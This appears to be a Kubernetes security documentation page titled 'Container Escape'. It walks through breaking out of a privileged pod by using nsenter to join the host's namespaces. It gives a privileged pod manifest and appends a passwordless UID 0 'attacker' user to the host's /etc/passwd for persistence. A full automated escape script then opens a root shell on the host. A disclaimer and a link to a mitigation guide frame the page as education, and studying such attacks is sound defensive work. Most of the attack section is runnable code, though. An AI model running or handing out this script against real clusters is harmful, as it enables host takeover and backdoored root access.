---
sidebar_position: 8
title: "Container Escape"
description: "How an attacker can break out of a container and gain control over the host system in Kubernetes."
---

# Container Escape

This guide provides a detailed walkthrough of escaping from a container to gain full control over the host system. The process involves entering the host's namespaces and modifying critical system files.

## **Warning: Security Risk**

**The information and the script included in this article are intended for educational and security research purposes only.** It demonstrates how an attacker can escape a container and gain access to the host system. Running this script on a production system or unauthorized environment can lead to **severe security breaches, data loss, and system compromise.**

**Use this script only in a controlled, isolated testing environment where you have explicit permission.** Misuse of this information may violate company policies or legal regulations.

**You are responsible for how you use this information.** Proceed with caution.

---

## Prerequisites

To successfully escape from a container, the following conditions must be met:

- The container must run as root (`runAsUser: 0`).
- `allowPrivilegeEscalation: true` must be enabled.
- `hostPID: true` must be set to share the host’s process namespace.
- The container must have access to `/proc/1/root`, which exposes the host’s root filesystem.
- The container must have permission to execute `nsenter`.
- The `/proc` filesystem must be accessible from within the container.
- The container must be running in privileged mode (`privileged: true`).

## Step 1: Deploy a Test Pod with Required Privileges

To demonstrate container escape, use the following YAML file to create a privileged pod:

```yaml
apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    run: test
  name: test
spec:
  hostPID: true
  containers:
    - image: busybox
      command: ["sleep", "infinity"]
      securityContext:
        runAsUser: 0
        allowPrivilegeEscalation: true
        privileged: true
      name: test
      resources: {}
  dnsPolicy: ClusterFirst
  restartPolicy: Always
status: {}
```

Apply the pod to the cluster:

```bash
kubectl apply -f test-pod.yaml
```

## Step 2: Identify the Container Environment

Before attempting to escape, check if the container is running with elevated privileges and shares the host’s process namespace.

### Check the Container’s Mount Namespace

Run inside the container:

```bash
ls -l /proc/1/ns/mnt
```

Example output:

```
lrwxrwxrwx 1 root root 0 Mar 17 16:38 /proc/1/ns/mnt -> 'mnt:[4026535581]'
```

This confirms that the container is isolated in a separate mount namespace from the host. We’ll override that using `nsenter`.

---

## Step 3: Escape to the Host’s Namespaces

Use `nsenter` to enter the host’s namespaces. This method is more reliable than attempting bind-mounts.

```bash
nsenter --target 1 --mount --uts --ipc --net --pid /bin/sh
```

Once inside, verify access:

```bash
hostname
whoami
```

If you’re in the host, you will see the host’s actual hostname and be root.

---

## Step 4: Create a Root User on the Host

Now that we’re inside the host context, you can add a root-level user to the host for persistence:

```bash
echo 'attacker:x:0:0::/root:/bin/bash' >> /etc/passwd
```

To verify:

```bash
grep attacker /etc/passwd
```

Expected output:

```
attacker:x:0:0::/root:/bin/bash
```

This creates a user named `attacker` with UID 0 (root privileges).

---

## **Automated Container Escape Script**

The following script automates the process of escaping a container by:

- Entering the host’s namespaces.
- Adding a new root user for persistence.
- Providing an interactive shell on the host.

```bash
#!/bin/sh

echo "[*] Checking if the container has access to the host's root filesystem..."
if [ ! -d "/proc/1/root" ]; then
    echo "[-] Cannot access /proc/1/root. Escape is not possible."
    exit 1
fi

echo "[+] Host root filesystem detected at /proc/1/root."

# Step 1: Ensure full namespace entry using exec nsenter
echo "[*] Attempting to enter the host's namespaces..."

exec nsenter --target 1 --mount --uts --ipc --net --pid --root=/proc/1/root /bin/sh -c '
    echo "[+] Successfully entered host namespaces."

    # Step 2: Modify /etc/passwd on the host to add an attacker user
    echo "[*] Adding attacker user to /etc/passwd..."
    echo "attacker:x:0:0::/root:/bin/bash" >> /etc/passwd

    echo "[+] Attacker user added. Verifying..."
    grep attacker /etc/passwd

    echo "[+] Escape complete. You are now inside the host."

    # Step 3: Verify the escape
    echo "[*] Checking system state..."
    echo "Hostname: $(hostname)"
    echo "User: $(whoami)"
    echo "[*] Checking if host kubelet process is visible..."
    ps aux | grep kubelet

    # Step 4: Open an interactive shell inside the host
    exec /bin/sh
'
```

---

## Conclusion

You successfully escaped the container by:

1. Deploying a privileged pod with `hostPID: true`.
2. Using `nsenter` to join the host’s namespaces.
3. Adding a root user to the host.
4. Gaining an interactive root shell on the host.

To learn how to prevent container escape vulnerabilities, refer to the mitigation guide:

➡ [Preventing Container Escape](/docs/best_practices/cluster_setup_and_hardening/pod_security/container_escape_mitigation)
